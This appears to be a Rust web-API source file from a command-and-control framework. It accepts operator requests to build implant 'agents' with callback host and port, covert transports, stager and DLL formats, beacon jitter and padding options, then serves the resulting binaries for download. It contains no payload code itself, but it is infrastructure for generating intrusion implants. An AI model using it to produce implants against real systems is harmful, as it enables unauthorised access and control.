// src/api/routes/builder.rs

use axum::{
    extract::{Path, State},
    http::{StatusCode, header},
    response::{IntoResponse, Response},
    Json, Extension,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::path::PathBuf;
use std::process::Stdio;
use tokio::io::AsyncBufReadExt;
use uuid::Uuid;
use chrono::Utc;

use crate::api::state::{ApiContext, BuildJob, BuildStatus};
use crate::api::middleware::OperatorInfo;

// ── Request / Response types ───────────────────────────────────────────

#[derive(Deserialize)]
pub struct BuildRequest {
    pub host: String,
    pub port: String,
    #[serde(default = "default_platform")]  pub platform:   String,
    #[serde(default = "default_transport")] pub transport:  String,
    #[serde(default = "default_profile")]   pub profile:    String,
    #[serde(default = "default_format")]    pub format:     String,
    #[serde(default = "default_sleep")]     pub sleep:      u64,
    #[serde(default = "default_jmin")]      pub jitter_min: u32,
    #[serde(default = "default_jmax")]      pub jitter_max: u32,
    #[serde(default)]                       pub bloat:      u64,
    #[serde(default)]                       pub debug:      bool,
    #[serde(default)]                       pub days:       i64,
}

fn default_platform()  -> String { "linux".into() }
fn default_transport() -> String { "tls".into() }
fn default_profile()   -> String { "default".into() }
fn default_format()    -> String { "exe".into() }
fn default_sleep()     -> u64   { 40 }
fn default_jmin()      -> u32   { 20 }
fn default_jmax()      -> u32   { 10 }

#[derive(Serialize)]
pub struct BuildStarted { pub job_id: String }

#[derive(Serialize)]
pub struct JobStatusResponse {
    pub job_id:        String,
    pub status:        String,
    pub log:           Vec<String>,
    pub artifact_name: Option<String>,
    pub started_at:    String,
    pub finished_at:   Option<String>,
}

// ── Helpers ────────────────────────────────────────────────────────────

fn find_builder_binary() -> Option<PathBuf> {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let p = dir.join("builder");
            if p.is_file() { return Some(p); }
        }
    }
    let p = PathBuf::from("./builder");
    if p.is_file() { return Some(p); }
    None
}

fn validate_request(req: &BuildRequest) -> Result<(), String> {
    if req.host.is_empty() { return Err("host is required".into()); }
    if req.port.is_empty() { return Err("port is required".into()); }
    match req.platform.as_str() {
        "linux" | "windows" | "macos" => {}
        o => return Err(format!("invalid platform: {}", o)),
    }
    match req.transport.as_str() {
        "tls" | "tcp_plain" | "named_pipe" | "http" | "https" => {}
        o => return Err(format!("invalid transport: {}", o)),
    }
    match req.profile.as_str() {
        "default" | "http_post" | "http_image" => {}
        o => return Err(format!("invalid profile: {}", o)),
    }
    match req.format.as_str() {
        "exe" | "dll" | "service" | "stager" => {}
        o => return Err(format!("invalid format: {}", o)),
    }
    if req.jitter_min > 100 { return Err("jitter_min cannot exceed 100".into()); }
    if req.days < 0          { return Err("days must be 0 or positive".into()); }
    Ok(())
}

// ── Route handlers ─────────────────────────────────────────────────────

/// POST /api/builder/build
pub async fn start_build(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Json(req): Json<BuildRequest>,
) -> Response {
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error":"Viewers cannot trigger builds"}))).into_response();
    }
    if let Err(e) = validate_request(&req) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": e}))).into_response();
    }

    let builder_path = match find_builder_binary() {
        Some(p) => p,
        None => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({
            "error": "builder binary not found alongside server binary or in CWD"
        }))).into_response(),
    };

    let job_id = Uuid::new_v4().to_string();
    {
        let mut jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
        jobs.insert(job_id.clone(), BuildJob {
            id:            job_id.clone(),
            status:        BuildStatus::Running,
            log:           Vec::new(),
            artifact_path: None,
            started_at:    Utc::now().to_rfc3339(),
            finished_at:   None,
            operator:      operator.username.clone(),
        });
    }

    if let Ok(conn) = state.db.get() {
        crate::database::audit_log(
            &conn, operator.id, &operator.username, "builder_start", None,
            Some(&format!("platform={} transport={} format={} host={}:{}",
                req.platform, req.transport, req.format, req.host, req.port)),
        );
    }

    let jobs_arc = state.build_jobs.clone();
    let jid      = job_id.clone();

    tokio::spawn(async move {
        let mut args: Vec<String> = vec![
            "--host".into(),        req.host.clone(),
            "--port".into(),        req.port.clone(),
            "--platform".into(),    req.platform.clone(),
            "--transport".into(),   req.transport.replace('_', "-"),
            "--profile".into(),     req.profile.replace('_', "-"),
            "--format".into(),      req.format.clone(),
            "--sleep".into(),       req.sleep.to_string(),
            "--jitter-min".into(),  req.jitter_min.to_string(),
            "--jitter-max".into(),  req.jitter_max.to_string(),
            "--bloat".into(),       req.bloat.to_string(),
            "--days".into(),        req.days.to_string(),
        ];
        if req.debug { args.push("--debug".into()); }

        fn push(jobs: &std::sync::Arc<std::sync::Mutex<std::collections::HashMap<String, BuildJob>>>,
                id: &str, line: String) {
            if let Ok(mut g) = jobs.lock() {
                if let Some(j) = g.get_mut(id) { j.log.push(line); }
            }
        }

        let mut child = match tokio::process::Command::new(&builder_path)
            .args(&args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
        {
            Ok(c)  => c,
            Err(e) => {
                push(&jobs_arc, &jid, format!("[-] Failed to spawn builder: {}", e));
                if let Ok(mut g) = jobs_arc.lock() {
                    if let Some(j) = g.get_mut(&jid) {
                        j.status      = BuildStatus::Failed;
                        j.finished_at = Some(Utc::now().to_rfc3339());
                    }
                }
                return;
            }
        };

        let stdout = child.stdout.take().unwrap();
        let stderr = child.stderr.take().unwrap();

        let ja = jobs_arc.clone(); let ji = jid.clone();
        let t1 = tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                push(&ja, &ji, line);
            }
        });

        let ja = jobs_arc.clone(); let ji = jid.clone();
        let t2 = tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(stderr).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if !line.trim().is_empty() { push(&ja, &ji, line); }
            }
        });

        let _ = tokio::join!(t1, t2);
        let ok = child.wait().await.map(|s| s.success()).unwrap_or(false);

        let artifact_path: Option<String> = {
            let g = jobs_arc.lock().unwrap_or_else(|e| e.into_inner());
            g.get(&jid).and_then(|j| {
                j.log.iter().find_map(|line| {
                    line.strip_prefix("[+] Binary: ").map(|p| p.trim().to_string())
                })
            })
        };

        if let Ok(mut g) = jobs_arc.lock() {
            if let Some(j) = g.get_mut(&jid) {
                j.status = if ok && artifact_path.is_some() {
                    BuildStatus::Success
                } else {
                    BuildStatus::Failed
                };
                j.artifact_path = artifact_path;
                j.finished_at   = Some(Utc::now().to_rfc3339());
            }
        }
    });

    (StatusCode::ACCEPTED, Json(BuildStarted { job_id })).into_response()
}

/// GET /api/builder/jobs/:id/status
pub async fn job_status(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
    Path(job_id): Path<String>,
) -> Response {
    let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
    match jobs.get(&job_id) {
        None => (StatusCode::NOT_FOUND, Json(serde_json::json!({"error":"Job not found"}))).into_response(),
        Some(job) => {
            let artifact_name = job.artifact_path.as_ref().and_then(|p| {
                std::path::Path::new(p).file_name().map(|n| n.to_string_lossy().into_owned())
            });
            (StatusCode::OK, Json(JobStatusResponse {
                job_id:        job.id.clone(),
                status:        format!("{:?}", job.status).to_lowercase(),
                log:           job.log.clone(),
                artifact_name,
                started_at:    job.started_at.clone(),
                finished_at:   job.finished_at.clone(),
            })).into_response()
        }
    }
}

/// GET /api/builder/jobs
pub async fn list_jobs(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
) -> Response {
    let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
    let mut list: Vec<JobStatusResponse> = jobs.values().map(|job| {
        let artifact_name = job.artifact_path.as_ref().and_then(|p| {
            std::path::Path::new(p).file_name().map(|n| n.to_string_lossy().into_owned())
        });
        JobStatusResponse {
            job_id:        job.id.clone(),
            status:        format!("{:?}", job.status).to_lowercase(),
            log:           vec![],
            artifact_name,
            started_at:    job.started_at.clone(),
            finished_at:   job.finished_at.clone(),
        }
    }).collect();
    list.sort_by(|a, b| b.started_at.cmp(&a.started_at));
    (StatusCode::OK, Json(list)).into_response()
}

/// GET /api/builder/jobs/:id/download
///
/// Protected by the standard X-API-KEY auth middleware.
/// The JS side uses fetch() + blob to trigger the save dialog,
/// which correctly sends the header. Direct browser navigation
/// won't work (no header) — that's intentional.
pub async fn download_artifact(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
    Path(job_id): Path<String>,
) -> Response {
    let (artifact_path, artifact_name) = {
        let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
        match jobs.get(&job_id) {
            None => return (StatusCode::NOT_FOUND, "Job not found").into_response(),
            Some(job) => match (&job.artifact_path, &job.status) {
                (Some(path), BuildStatus::Success) => {
                    let name = std::path::Path::new(path)
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_else(|| "agent".into());
                    (path.clone(), name)
                }
                (_, BuildStatus::Running) =>
                    return (StatusCode::ACCEPTED, "Build still in progress").into_response(),
                _ =>
                    return (StatusCode::NOT_FOUND, "No artifact (build failed or not started)").into_response(),
            }
        }
    };

    match std::fs::read(&artifact_path) {
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR,
            format!("Failed to read artifact: {}", e)).into_response(),
        Ok(bytes) => {
            let safe_name: String = artifact_name.chars()
                .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
                .collect();
            (
                StatusCode::OK,
                [
                    (header::CONTENT_TYPE,        "application/octet-stream".into()),
                    (header::CONTENT_DISPOSITION, format!("attachment; filename=\"{}\"", safe_name)),
                    (header::CONTENT_LENGTH,      bytes.len().to_string()),
                ],
                bytes,
            ).into_response()
        }
    }
}
